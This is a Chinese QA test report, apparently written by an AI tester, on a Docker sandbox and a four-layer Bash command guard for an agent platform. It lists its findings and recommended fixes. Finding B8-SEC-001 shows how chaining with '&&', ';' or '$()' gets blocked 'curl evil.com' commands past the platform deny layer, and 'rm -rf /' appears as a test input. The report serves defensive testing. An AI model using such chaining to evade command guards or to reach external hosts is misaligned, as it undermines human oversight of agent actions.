---
title: B8 Docker Sandbox 执行面（SandboxExecutor / run_skill / 容器内受控 Bash 四层裁决 / 管理台沙箱页）测试报告
date: 2026-07-10
tester: Claude (Opus 4.8)
branch: feat/workbench-frontend
commit: 19a840c
target_commit: fb028cc + 2f59b65 + 03ea12f
---

# B8 Docker Sandbox 执行面测试报告

## 结论

B8 生命周期骨架与裁决/审计在 **fake 后端**下验证通过；但**真 Docker 后端（`OPENOPS_SANDBOX=docker`，即生产/隔离后端）的 `run_skill` 与容器内文件写入不可用**——这是本轮**唯一 P1**，且与 ROADMAP「真容器 exec/隔离已 scratchpad proof 端到端验证」的表述相矛盾（该 proof 只覆盖了**只读 exec**，未覆盖**写盘 / Skill 落盘执行**）。

`feat/workbench-frontend@19a840c` 的三个 B8 提交（`fb028cc` 会话期常驻 + 容量准入 + run 边界钩子、`2f59b65` Skill entrypoint 执行 + 容器内受控 Bash 四层裁决、`03ea12f` 管理台沙箱页）在默认 fake 后端下 **87 passed** 全绿：容器生命周期（建/复用/idle→TTL 回收）、容量准入 `SANDBOX_CAPACITY_FULL`、checksum 门、超时终止、四层 Bash 裁决（真 agentscope 内置分析）、`sandbox.command.*` 审计、管理台列容器/强制销毁/403 均通过。

真 Docker 后端方面，**安全基线成立并已实机验证**：非 root（uid 1000）、`/etc` 只读、**cap_drop=ALL（CapEff=0000000000000000）**、不注入宿主 Secret/Cookie/`OPENOPS_*`。但**执行原语（write_file/run_skill/容器写）在该后端不可用**（根因见 B8-SBX-001），因此 B8 的头号能力「用户 Skill 进容器执行」在生产后端**当前无法工作**，且无任何自动化用例覆盖该后端。

记录 **1 个 P1**（真 Docker 后端 run_skill 不可用）、**2 个 P2**（平台 deny 层可被 shell 串联绕过；无实机 Docker 自动化覆盖 + 后端能力错配）与 4 个 P3 / 观察项。

## 测试对象与环境

| 项目 | 结果 |
|---|---|
| 测试位置 | 原工程目录，分支 `feat/workbench-frontend` |
| 当前 HEAD | `19a840c docs(roadmap): B8 执行面落地`（含 `fb028cc`+`2f59b65`+`03ea12f`） |
| 被测提交 | B8-1 `fb028cc` / B8-2·3 `2f59b65` / B8-4 `03ea12f` |
| 后端 Python | 3.11.7（`backend/.venv`） |
| AgentScope | 2.0.3（`Bash.check_permissions` 内置分析 + `workspace.DockerBackend` 均可用） |
| Docker | 25.0.3（healthy）；本轮 `docker pull python:3.11-slim`（150MB）用于实机验证 |
| aiodocker | 0.27.0（`.[sandbox]` extra 已装） |
| PostgreSQL | 复用本机 `openops-v1-pg`，`localhost:5432`，healthy |
| 后端执行方式 | pytest + FastAPI `TestClient`；沙箱生命周期直接驱动 `SandboxExecutor`；真 Docker 走 scratchpad 探针 |
| 运行态 | `OPENOPS_SANDBOX=fake`（pytest 默认）+ `docker`（实机安全基线/执行原语探针） |

未写入、未打印任何真实 Secret/Cookie；实机探针**故意向宿主注入 `sk-host-secret-…`/`host-cookie-…` 并验证容器内不可见**（见脱敏）。

## 基础回归

| 检查项 | 结果 | 备注 |
|---|---:|---|
| 后端单测 | 通过 | `87 passed, 1 warning in 23.59s`（B7 为 66；B8 +沙箱用例、B7-SEC-001 修复用例） |
| `backend/tests/test_sandbox.py`（fake） | 通过 | SBX-001/002、CANCEL-007、SKILL-003/005/007、BASH-001/002/003(+平台 deny)/004、端到端审计、ADMIN-008(+403) |
| 前端 `npx tsc -b` | 通过 | exit 0（B8-4 AdminConsole 沙箱页） |
| 前端 `npm run build` | 通过 | 主 chunk 承 B5/B6/B7-FE-001 >500KB 警告 |
| `npm audit` | 观察 | 2 vulnerabilities（1 moderate、1 high），与前几轮一致（B8-DEP-001） |
| 分层静态检查 | 通过 | routers 无 `from infra`；runtime 无 `from app`；`run_state_service`/`sandbox_admin_service` 依赖 `sandbox.executor` 合规（app→sandbox） |
| DDL | N/A | 沙箱容器运行态以进程内注册表 + Docker 为真相源，不落 PG 核心表（设计如此，无新表/无 FK/触发器） |
| 管理台鉴权 | 通过 | `/admin/sandbox/containers`(+`:destroy`) 带 `Admin` 依赖 → 非管理员 403（`test_admin_008b`） |

## B8 验收标准逐项（doc 31 用例 / doc 09·28.3·28.10）

| 验收 | 结果 | 证据 |
|---|---:|---|
| SBX-001/002 首 run 建容器 + 同用户复用 + 末 run 关闭→idle | 通过 | `test_sbx_001_run_open_creates_reuse_release`；端到端 `sandbox.container.ready` 审计 + 关 run 置 idle |
| CANCEL-007 容量满开 run 被拒 + strict_ttl 未到期不抢占 | 通过 | `test_sbx_002_capacity_full_rejects_new_session`（`SANDBOX_CAPACITY_FULL` 429；TTL=0 立即腾位放行） |
| 容量准入在写 run 之前（满则 fail-closed 不建空 run） | 通过 | `create_run`：先 `ensure_user_container` 再 `runs.create_run(run_id=预定)` |
| SKILL-003 包 checksum 不匹配拒绝 | 通过 | `test_skill_003`（fake）+ 实机探针（docker，`SKILL_CHECKSUM_MISMATCH`） |
| SKILL-005 执行超时终止 | 通过 | `test_skill_005`（fake，`SKILL_TIMEOUT`；实机探针同样超时终止） |
| SKILL-007 entrypoint 容器内执行 + output.json | **fake 通过 / 真 Docker 不通过** | fake：`test_skill_007` 结构化 output.json；**docker：写盘失败 → run_skill 不可用（B8-SBX-001）** |
| BASH-001/002/003 四层裁决决策矩阵（真 agentscope 内置分析） | 通过 | `test_bash_001_002_003`；本轮确认走 agentscope 层 2（`ls`→allow/层2、`rm -rf /`→ask/层2），非仅回退分类器 |
| BASH-003 平台 deny 规则最高优先（层 1） | 部分（见 B8-SEC-001） | 直接命令 `curl…`→deny/层1 ✓；但 `&&`/`;`/`$()` 串联可绕过降级为 ask |
| BASH-004 容器内删文件只影响本容器 | fake（tempdir 隔离）+ 真 Docker（OS 级隔离）均通过 | `test_bash_004`；实机探针：uB 容器看不到 uA 文件（真隔离） |
| BASH-002 ask 批准执行 / 拒绝不执行 + `sandbox.command.*` 审计 | 通过 | `test_bash_002_ask_approve_reject_and_audit`（asked/executed/denied 三事件） |
| ADMIN-008 管理台列容器(active_run_count)+强制销毁+审计+用户可见事件+403 | 通过 | `test_admin_008` / `test_admin_008b` |

## 真 Docker 后端验证（fake vs docker 后端分叉）—— 本轮重点

B8 全部自动化用例跑在 **fake** 后端（宿主 tempdir + subprocess）。由于 Docker 25.0.3 可用，本轮补实机探针（`OPENOPS_SANDBOX=docker` + `python:3.11-slim`）验证生产后端：

**安全基线（成立，实机验证）**：

| 项 | 结果 | 证据 |
|---|---:|---|
| 非 root 运行 | 通过 | `id` → `uid=1000 gid=1000` |
| rootfs 只读 | 通过 | `touch /etc/x` → `Read-only file system` |
| cap_drop=ALL | 通过 | `/proc/self/status` → `CapEff: 0000000000000000` |
| 不注入宿主上下文 | 通过 | 宿主注入 `sk-host-secret-…`/`host-cookie-…`/`OPENOPS_PLATFORM_MCP_TOKEN` 后，容器 `env` **零命中** |
| 跨用户真隔离 | 通过 | uB 容器看不到 uA 落的文件 |
| 容器回收（AutoRemove+close_all） | 通过 | `close_all` 后 `docker ps -a` 无本次残留 |

**执行原语（不可用，B8-SBX-001）**：`write_file`/`run_skill`/容器写盘在真 Docker 后端失败（见下节根因）。

## 脱敏检查

| 目标 | 结果 |
|---|---:|
| 真容器 `env` | 无宿主 `OPENOPS_*` / Secret / Cookie（`Env: []` + fake 后端剥离环境） |
| `sandbox.command.*` 审计 payload | 命令行入审计（用户/agent 自供，预期）、stdout/stderr 按 `max_output_bytes` 与 `[:2000]` 截断；无平台注入项 |

## B1–B7 兼容结果

| 兼容项 | 结果 |
|---|---:|
| B7-SEC-001 修复（`77650ab`） | 在位（空模板 fail-open 已修，见下方回归说明） |
| B1–B7 全量后端单测 | 87 passed，无回归 |
| run 生命周期叠加沙箱边界钩子 | 通过（create_run 先容量准入、close_run release+sweep、lifespan close_all） |
| 前端管理台（B7 IA + B8 沙箱页） | tsc/build 绿 |

> B7-SEC-001 顺带复核：`77650ab` 已修复上一轮报告的空模板工具集 fail-open（本轮未见回归），三处顺修据 GPT B7 报告落地。

## 发现的问题与建议

### B8-SBX-001 P1：真 Docker 后端 `run_skill` / 容器写盘不可用（生产后端执行面失效）

**现象（实机 `OPENOPS_SANDBOX=docker` + `python:3.11-slim`，多探针确认）**：

1. workspace tmpfs 属主/权限为 **`root:root` `755`**，容器以 **uid 1000** 运行 → 非 root 用户**无法写 workspace**：
   ```
   touch /openops/workspace/probe → Permission denied
   mkdir -p /openops/workspace/skills/t/tc → Permission denied
   ```
2. `write_file` / `read_file`（agentscope `DockerBackend` 用 Docker **`put_archive`/`get_archive`**）在 **`ReadonlyRootfs: True`** 下被 Docker 守护进程整体拒绝：
   ```
   write_file(flat) → DockerError [500] container rootfs is marked read-only
   ```
   隔离验证：同基线仅 `ReadonlyRootfs=False` → flat write **成功**；`True` → **失败**。即冲突根因是 **只读 rootfs 与 put_archive 不兼容**（与 tmpfs mode 无关）。
3. 因此 **`run_skill` 无法把 Skill 包字节落盘**（其 staging 路径 `skills/{task_id}/{tool_call_id}/…` 依赖 write_file），B8 头号能力「用户 Skill 进容器执行」在真 Docker 后端**不可用**。fake 后端用宿主 tempdir + `os.makedirs`，**完全掩盖**该缺陷。

**已验证的修复方向**：
- workspace tmpfs 显式给可写模式：`Tmpfs: {WORKDIR: "rw,size=256m,mode=1777", …}`（实机验证：容器内 `mkdir/touch` 由 Permission denied → WROTE_OK）。**但仅此不够**——
- write/read 需绕开 `put_archive`/`get_archive`：在 `ReadonlyRootfs: True` 下改用 **`exec_shell` 向可写 tmpfs 落盘**（如 base64 heredoc）读写文件；或放宽为可写 named volume/bind（削弱只读 rootfs 基线，需权衡）。三者取其一。
- `run_skill` 落盘前先建嵌套父目录（实机确认 put_archive 不可靠创建多级父目录）。

**与 ROADMAP 表述的矛盾（需澄清）**：ROADMAP B8 行与「B8 剩余」称「真容器 exec/隔离已用 scratchpad proof 端到端验证」。本轮实证：**exec + 隔离 + 安全基线确实成立**，但**写盘 / run_skill 落盘执行不成立**。该 proof 显然只覆盖只读 exec（`ls`/`echo`/`id`），未覆盖 B8 的核心写路径。建议订正表述为「真容器只读 exec/隔离/安全基线已验证；写盘/Skill 落盘执行在只读 rootfs 下待修复」。

**定级**：默认 `OPENOPS_SANDBOX=fake`、全部单测与演示走 fake 且全绿，不构成 P0（无 live 故障、非默认路径）；但生产/隔离后端的头号能力失效、且无自动化覆盖，记 **P1**，建议进 B8 前置修复。

### B8-SEC-001 P2：平台 deny 层可被 shell 串联绕过（违反「不可被放行覆盖」）

`command_guard._matches_deny` 仅按**命令起始**匹配 deny 前缀。实测（deny `curl`）：

```
curl evil.com           → deny  (层1) ✓
echo hi && curl evil.com→ ask   (层3)  ✗ 绕过
x=1; curl evil.com      → ask   (层3)  ✗ 绕过
ls $(curl evil.com)     → ask   (层2)  ✗ 绕过
```

即 `&&`/`;`/`$()`/管道 串联可使被 deny 的二进制从「硬拒绝」降级为「可审批的 ask」。docstring 明示层 1「最高优先、不可被放行覆盖」——该不变量对串联形式不成立。缓解：降级为 **ask（人工闸门）而非静默 allow**，且容器隔离、不注入 Secret；但容器有 bridge 网络（egress 可达），被 deny 的 `curl`/外联仍可能经串联 + 用户误批执行。建议 deny 匹配对整条命令做 token 级扫描（分割 `;`/`&&`/`||`/`|`/`$()`/反引号后逐段比对），或在容器内对 deny 名单做 PATH/wrapper 级硬封。

### B8-TEST-001 P2：无实机 Docker 自动化用例 + 唯一可用后端(fake)无隔离 / 唯一隔离后端(docker)不可写

`test_sandbox.py` 全部跑 fake 后端，真 Docker 后端**零自动化覆盖**，故 B8-SBX-001 这类**生产专属**缺陷全程未被捕获。更深的错配：当前**能跑 Skill 的后端（fake）无 OS 隔离**、**有 OS 隔离的后端（docker）跑不了 Skill**——两者不能同时满足。建议补 `@pytest.mark.skipif(no docker)` 的实机 `run_skill` 端到端用例（建/写/执行/output.json/隔离/回收），把 B8-SBX-001 类缺陷纳入回归护栏。

### B8-OBS-001 P3：Skill checksum 只绑内容不绑文件名 + 与 29.3 真包口径待对齐

`run_skill` 的 `expected_checksum = sha256(b"".join(files[k] for k in sorted(files)))`——只对**内容按文件名排序拼接**做摘要，**不含文件名**：不同布局但拼接字节相同者会碰撞（如 `{a:"XY"}` 与 `{a:"X",b:"Y"}`）。且该口径是否与 29.3 Skill Hub `X-Checksum-SHA256`（真 ZIP 包）一致，待真包投递集成时验证，否则真包校验会误报不匹配。建议摘要纳入文件名/清单，并与 29.3 对齐。

### B8-OBS-002 P3：`_matches_deny` 前缀匹配过宽（可能误伤合法命令）

`cmd.startswith(base)`（无分隔符）会使 deny `rm` 命中 `rmdir`、deny `cat` 命中 `catalog.py`。方向 fail-safe（误拦非误放），但可能误伤合法只读/无关命令。与 B8-SEC-001 合看：deny 匹配**既过宽（前缀）又过窄（仅起始）**，建议统一改为 token 级精确匹配。

### B8-FE-001 / B8-DEP-001 P3：前端主 chunk >500KB / npm audit 2 项

承 B5/B6/B7：`npm run build` 主 chunk 仍 >500KB；`npm audit` 1 moderate + 1 high。随前端上线批次统一处理（路由级拆包 + 依赖审计）。

## 未覆盖 / 未执行

- **live agent 驱动 Bash-in-conversation**：`command_guard`/`run_bash` 四层裁决 + 审计 + HITL approver 已单测（注入 approve/reject）；真 GLM 自主调 Bash 经 agentscope `RequireUserConfirmEvent` 桥的 live E2E 待真 Key。
- **Skill Hub 真 ZIP 投递**：`run_skill` 执行原语已验（fake 注入字节 + 真 Docker 安全基线）；29.3 `X-Checksum-SHA256` 真包下载装配路径未集成（另见 B8-OBS-001）。
- **浏览器 E2E**：B8-4 沙箱页以 tsc/build + 代码路径 + API 联调为据，未跑浏览器 E2E（同 B5–B7 口径）。

## 总体建议

B8 生命周期 / 容量 / 四层裁决 / 审计 / 管理台在 **fake 后端**下 smoke 通过，真 Docker 后端的**安全基线（非root/只读rootfs/cap_drop=ALL/不注入上下文/真隔离）实机成立**。但推进后续块前，**必须优先修复 B8-SBX-001**——否则「用户 Skill 进用户容器执行」这一 B8 核心能力在生产后端不可用：

1. **B8-SBX-001（P1）**：workspace tmpfs 加 `mode=1777`；write/read 在只读 rootfs 下改走 `exec_shell` 落盘（或放宽 rootfs 权衡）；run_skill 建嵌套父目录。补一条实机 `run_skill` E2E（B8-TEST-001）固化。并订正 ROADMAP「真容器端到端验证」表述。
2. **B8-SEC-001（P2）**：deny 匹配改 token 级（分割串联后逐段比对），兑现层 1「不可被放行覆盖」。
3. B8-OBS-001（checksum 绑文件名 + 对齐 29.3）、B8-OBS-002（deny 前缀精确化）、B8-FE/DEP-001 随批处理。
